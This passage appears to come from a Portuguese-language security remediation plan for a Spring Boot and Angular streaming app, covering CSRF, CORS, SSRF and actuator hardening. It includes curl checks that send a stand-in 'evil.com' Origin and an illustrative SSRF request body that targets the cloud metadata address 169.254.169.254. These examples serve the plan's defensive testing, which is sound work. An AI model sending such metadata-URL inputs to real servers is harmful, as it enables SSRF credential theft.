   - `SecurityConfig.java`: `.csrf(csrf -> csrf.disable())` → `.csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))`
   - `auth.interceptor.ts` (Angular): adicionar leitura do `XSRF-TOKEN` cookie e envio via header `X-XSRF-TOKEN`
   - `CorsConfig.java`: confirmar que `allowedHeaders` inclui `X-XSRF-TOKEN`
4. Documentar que `CookieCsrfTokenRepository.withHttpOnlyFalse()` é o DBS nativo do Spring — o Angular lê o cookie e envia como header

**Critério de conclusão:** specs criados e documentados como Fase 2 + lista de mudanças registrada.

---

### Sprint 6 — Verificação do interceptor Angular (Frontend)

**Objetivo:** Confirmar que o `auth.interceptor.ts` filtra corretamente as URLs antes de adicionar o header `Authorization`.

**Passo a passo:**

1. Abrir `auth.interceptor.spec.ts` e adicionar os casos do Cenário F1:
   - Caso positivo: URL da API recebe header `Authorization`
   - Caso negativo: URL externa (CDN, Google) não recebe header `Authorization`
2. Rodar os specs e confirmar o comportamento atual
3. Se o interceptor não filtrar por URL, abrir `auth.interceptor.ts` e adicionar verificação:
   ```typescript
   intercept(req: HttpRequest<any>, next: HttpHandler): Observable<HttpEvent<any>> {
     const token = this.authService.getToken();
     const isApiRequest = req.url.startsWith(environment.apiUrl);

     if (token && isApiRequest) {
       const authReq = req.clone({
         headers: req.headers.set('Authorization', `Bearer ${token}`)
       });
       return next.handle(authReq);
     }
     return next.handle(req);
   }
   ```
4. Rodar os specs e confirmar verde

**Critério de conclusão:** spec verde + token nunca enviado para URLs fora da `environment.apiUrl`.

---

### Sprint 7 — Validação de CORS em ambiente de produção

**Objetivo:** Verificar que a configuração CORS de produção não tem origem wildcarded ou origens inesperadas.

**Passo a passo:**

1. Em produção, inspecionar manualmente:
   ```bash
   curl -I -H "Origin: https://evil.com" https://api.vidalongaflix.com.br/api/videos
   # Resultado esperado: sem Access-Control-Allow-Origin na resposta

   curl -I -H "Origin: https://vidalongaflix.com" https://api.vidalongaflix.com.br/api/videos
   # Resultado esperado: Access-Control-Allow-Origin: https://vidalongaflix.com

   curl -I -H "Origin: https://vidalongaflix.com" https://api.vidalongaflix.com.br/api/videos
   # Resultado esperado: Vary: Origin presente (para cache correto)
   ```
2. Verificar no Elastic Beanstalk que `CORS_ALLOWED_ORIGINS` não contém `*`
3. Confirmar que as três origens listadas (`vidalongaflix.com`, `www.vidalongaflix.com`, `CloudFront`) são as únicas

**Critério de conclusão:** `evil.com` não recebe `Access-Control-Allow-Origin` + origens legítimas funcionam.

---

### Verificação Final — Todos os Sprints

**Backend:** `./mvnw test` — suite completa verde incluindo os novos specs de CORS, CSRF e SSRF.

**Frontend:** `npm test -- --watch=false` — specs do interceptor passando.

**Integração manual:**
1. `curl -H "Origin: https://evil.com" -X OPTIONS https://api.vidalongaflix.com.br/api/videos` → sem `Access-Control-Allow-Origin`
2. `curl https://api.vidalongaflix.com.br/api/actuator/env` → HTTP 401
3. `curl https://api.vidalongaflix.com.br/api/actuator/health` → HTTP 200 (continua público)
4. Inspecionar no DevTools do browser: login → OPTIONS enviado → POST real enviado → sem erros CORS no console
5. Verificar DevTools → Application → Local Storage → confirmar que nenhuma chave contém o token JWT sendo enviado para domínios externos

---

## Fluxos Específicos do Frontend Angular

---

### Fluxo 1 — Por que o Angular não precisa de CSRF token hoje

**Conceito aplicado:** A proteção CSRF do Angular é implícita pela arquitetura de Bearer token. O `auth.interceptor.ts` adiciona `Authorization: Bearer {token}` em todas as requisições para a API. Um atacante em outra origem não pode ler o token do localStorage (SOP) e não pode incluir headers customizados via formulários HTML.

**O que verificar no projeto:**
- `auth.interceptor.ts`: confirmar que o header `Authorization` é adicionado programaticamente, não como cookie
- Nenhum endpoint da API usa autenticação por cookie — confirmar nos `requestMatchers` do `SecurityConfig.java`

**Regra para o futuro:** qualquer migração para cookie-based auth exige ativar `CookieCsrfTokenRepository` simultaneamente.

---

### Fluxo 2 — CORS e o ciclo de vida de uma requisição Angular

**Conceito aplicado:** Quando o Angular faz `this.http.get('/api/videos')`, o browser executa o ciclo CORS completo antes de qualquer dado ser lido:

```
1. Browser detecta: origem do Angular ≠ origem da API
2. Browser envia OPTIONS /api/videos com os headers que pretende usar
3. Servidor responde com Access-Control-Allow-Origin, -Methods, -Headers
4. Browser verifica: origem do Angular está na lista? SIM → continua
5. Browser envia GET /api/videos real
6. Servidor processa e responde
7. Browser verifica novamente os CORS headers da resposta
8. Browser permite que o Angular leia o JSON da resposta
```

**O que pode quebrar:** se `CORS_ALLOWED_ORIGINS` não incluir o CloudFront (`d2efnb2x9r22my.cloudfront.net`), o Angular em produção não consegue ler nenhuma resposta da API.

**Arquivos afetados:** `CorsConfig.java` (backend) + `environment.prod.ts` (frontend).

---

### Fluxo 3 — SOP como defesa passiva no Angular

**Conceito aplicado:** A SOP do browser já protege o Angular de ataques onde um iframe ou script de outro domínio tente ler as respostas da API. O Angular não precisa fazer nada explícito — a proteção é do browser.

**O que pode enfraquecer a SOP:**
- `COOP: unsafe-none` (ausência de `Cross-Origin-Opener-Policy`) — permite `window.opener` cross-origin
- `CORS: Access-Control-Allow-Origin: *` — permite que qualquer origem leia as respostas
- `COEP` ausente — permite que recursos cross-origin compartilhem memória

**Conexão com security-1.4 Sprint 1:** quando os headers de segurança forem ativados (substituindo `headers.disable()`), o `Cross-Origin-Opener-Policy: same-origin` vai ser adicionado automaticamente, reforçando a SOP com isolamento de processo.

---

### Fluxo 4 — SSRF não existe no frontend (mas existe no backend via frontend)

**Conceito aplicado:** O Angular roda no browser do usuário — não tem acesso à rede interna do servidor. Portanto, o Angular em si não pode ser vetor de SSRF. O risco existe quando o Angular envia uma URL para o backend e o backend faz a requisição.

**Cenário de risco futuro:**
```typescript
// Se o Angular permitir que usuários informem uma URL de thumbnail:
this.videoService.importWithThumbnail(videoId, userProvidedUrl);
// → POST /admin/videos/{id}/thumbnail com body: { url: "http://169.254.169.254/..." }
// → Backend faz fetch dessa URL → SSRF
```

**O que verificar:** nenhum campo do Angular atualmente permite que o usuário forneça uma URL para ser buscada pelo servidor. Se isso for implementado, o `SsrfProtectionService` do Sprint 4 deve ser chamado antes.

---

### Fluxo 5 — Preparação para CSRF com cookies (Fase 2)

**Conceito aplicado:** Quando a migração para HttpOnly cookie for feita (security-1.3 Sprint 7), o Angular precisará implementar o DBS automaticamente.

O `HttpClientModule` do Angular tem suporte nativo ao DBS: se um cookie chamado `XSRF-TOKEN` existir, o Angular lê seu valor e inclui automaticamente no header `X-XSRF-TOKEN` em requisições não-GET.

**O que configurar no Angular:**
```typescript
// app.config.ts
import { provideHttpClient, withXsrfConfiguration } from '@angular/common/http';

provideHttpClient(
  withXsrfConfiguration({
    cookieName: 'XSRF-TOKEN',       // nome do cookie gerado pelo Spring
    headerName: 'X-XSRF-TOKEN'     // header enviado pelo Angular
  })
)
```

**Importante:** o cookie `XSRF-TOKEN` deve ser `HttpOnly=false` para que o Angular possa lê-lo. Apenas o cookie de sessão (com o JWT) deve ser `HttpOnly=true`.

**Arquivos afetados:** `app.config.ts` (Angular) + `SecurityConfig.java` (Spring) + `CorsConfig.java` (adicionar `X-XSRF-TOKEN` aos allowedHeaders).

---

## Resumo — Estado do Projeto Após os Sprints

| Vulnerabilidade | Antes | Depois | Status |
|---|---|---|---|
| `allowedHeaders("*")` no CORS | Qualquer header aceito de origens permitidas | Lista explícita: Authorization, Content-Type, Accept, X-Requested-With | ✅ Resolvido |
| `/actuator/**` público | Variáveis de ambiente expostas sem autenticação | Apenas `/actuator/health` e `/actuator/info` públicos — demais exigem ROLE_ADMIN | ✅ Resolvido |
| `RestTemplate` sem timeout no WhatsApp | Thread pode bloquear indefinidamente em falha da API externa | Timeout de 5s/10s + injeção de dependência (não instanciado por chamada) | 🔴 Pendente (Sprint 3) |
| Sem proteção SSRF | Nenhum serviço valida URLs de entrada (risco latente) | `SsrfProtectionService` criado como padrão obrigatório para features futuras | 🔴 Pendente (Sprint 4) |
| Cookie de sessão com `SameSite=Strict` | Quebraria auth em produção (cross-domain) | `SameSite=None; Secure` — obrigatório para arquitetura `.com` + `.com.br` | ✅ Resolvido (21/06/2026) |
| CSRF — ausência de proteção com cookies | JWT Bearer protege implicitamente; com cookie, proteção some | Cookie httpOnly em produção; CSRF token (DBS) pendente para próxima fase | ⚠️ Em andamento |
| Token JWT no localStorage | Exposto a XSS — JavaScript consegue ler e exfiltrar | Removido do localStorage; auth via httpOnly cookie (inacessível a JS) | ✅ Resolvido (21/06/2026) |
| Logout sem expirar cookie no servidor | Cookie continuava válido até 2h após logout | `POST /auth/logout` envia `Max-Age=0` — browser apaga o cookie imediatamente | ✅ Resolvido (21/06/2026) |
| Interceptor com leitura de token | `getToken()` lia localStorage — código morto após migração | Interceptor simplificado: só adiciona `withCredentials: true` para a API | ✅ Resolvido (21/06/2026) |
| CORS em produção não verificado | Possível misconfiguration silenciosa | Verificação manual com curl + confirmação de que `evil.com` não recebe CORS headers | ⏳ Pendente (Sprint 7) |